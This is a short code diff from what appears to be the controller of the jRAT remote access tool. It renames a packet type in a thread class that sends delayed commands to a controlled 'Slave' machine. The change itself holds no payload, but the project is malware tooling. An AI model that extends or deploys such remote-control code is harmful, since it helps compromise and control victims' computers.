@@ -1,15 +1,15 @@
 package jrat.controller.threads;
 
 import jrat.controller.Slave;
-import jrat.controller.packets.outgoing.AbstractOutgoingPacket;
+import jrat.controller.packets.outgoing.OutgoingPacket;
 
 public class ThreadDelayedCommand extends Thread {
 
 	private Slave slave;
-	private AbstractOutgoingPacket packet;
+	private OutgoingPacket packet;
 	private long ms;
 
-	private ThreadDelayedCommand(Slave slave, AbstractOutgoingPacket packet, long ms) {
+	private ThreadDelayedCommand(Slave slave, OutgoingPacket packet, long ms) {
 		super("Delayed thread");
 		this.slave = slave;
 		this.packet = packet;
@@ -25,7 +25,7 @@ public class ThreadDelayedCommand extends Thread {
 		}
 	}
 
-	public static ThreadDelayedCommand start(Slave slave, AbstractOutgoingPacket packet, long ms) {
+	public static ThreadDelayedCommand start(Slave slave, OutgoingPacket packet, long ms) {
 		ThreadDelayedCommand cmd = new ThreadDelayedCommand(slave, packet, ms);
 		cmd.start();
 		return cmd;
